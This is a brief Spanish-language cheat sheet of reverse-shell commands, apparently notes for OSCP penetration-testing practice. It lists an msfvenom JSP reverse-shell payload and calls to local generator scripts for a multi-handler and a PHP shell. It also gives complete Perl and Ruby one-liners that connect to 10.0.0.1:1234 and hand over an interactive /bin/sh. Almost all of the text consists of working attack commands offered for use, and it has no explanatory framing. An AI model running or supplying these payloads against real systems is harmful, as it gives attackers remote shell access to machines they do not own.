# Seccion de explotacion

## Shell reversa

Previamente `export PAYLOAD=<nombre-payload>; export LHOST=<IP-local>; export LPORT=<puerto local>`

### Multi Handler
1) Generar un Multi Handler automatico --> `$OSCP/explotacion/multi-handler/generator.sh $PAYLOAD $LHOST $LPORT`

### Shell reversas

2) JSP  --> `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > shell.jsp`

3) PHP  --> `$OSCP/explotacion/reverse-shells/php-reverse/generator.sh $LHOST $LPORT`

4) PERL --> `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

5) RUBY --> `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
